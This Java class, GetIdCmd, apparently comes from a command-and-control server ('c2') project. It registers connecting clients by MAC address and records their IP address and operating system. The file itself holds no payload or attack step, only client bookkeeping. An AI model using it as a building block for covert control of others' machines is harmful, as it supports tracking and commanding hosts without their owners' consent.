package commands;

import server.CommandServer;
import server.ConnectedClient;
import tools.ParsedCommand;

/**
 * Assign an id to a client
 * 
 * @author Yohan Chalier
 *
 */
public class GetIdCmd extends ServerCommand {

	public GetIdCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		
		ConnectedClient client = c2.getClients().findByMac(pCmd.args[0]);
		int id;
		
		if (client != null) // Already known client
			id = client.getId(); 
		else				// New client
			id = c2.getClients().addClient(pCmd.args[0]);
		
		// Storing IP
		c2.getClients().get(id).setInetAddress(pCmd.args[1]);
		
		// Storing OS
		c2.getClients().get(id).setOs(pCmd.argLine(2));
		
		return Integer.toString(id);
	}

}
